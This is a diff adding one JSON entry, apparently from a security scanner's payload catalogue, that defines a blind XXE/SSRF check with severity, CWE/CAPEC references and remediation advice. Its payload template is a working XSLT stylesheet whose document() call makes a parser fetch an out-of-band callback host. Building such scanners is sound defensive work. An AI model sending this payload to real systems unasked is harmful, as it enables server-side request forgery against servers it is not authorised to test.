@@ -1,0 +1,22 @@
+{
+  "id": "m3-blind-xxe-xslt-document",
+  "bug_class": "blind_xxe",
+  "title": "Blind XXE/SSRF (XSLT document() out-of-band fetch)",
+  "severity": "High",
+  "applies_when": {
+    "always": true
+  },
+  "insertion_kinds": [
+    "body_whole"
+  ],
+  "oracle": {
+    "kind": "oob",
+    "payload_template": "<?xml version=\"1.0\"?><xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"><xsl:template match=\"/\"><xsl:value-of select=\"document('http://{callback}')\"/></xsl:template></xsl:stylesheet>"
+  },
+  "references": [
+    "CWE-611",
+    "CAPEC-201"
+  ],
+  "remediation": "Disable external entity and DTD processing in every XML/SVG/SOAP/XSLT parser (secure-processing, no DOCTYPE, no external general+parameter entities, disable XInclude and the document()/xsl fetch). Prefer a hardened parser or a non-XML format. The inbound callback on parse proves the entity/reference was dereferenced.",
+  "payload_family": "xxe-xslt-document"
+}
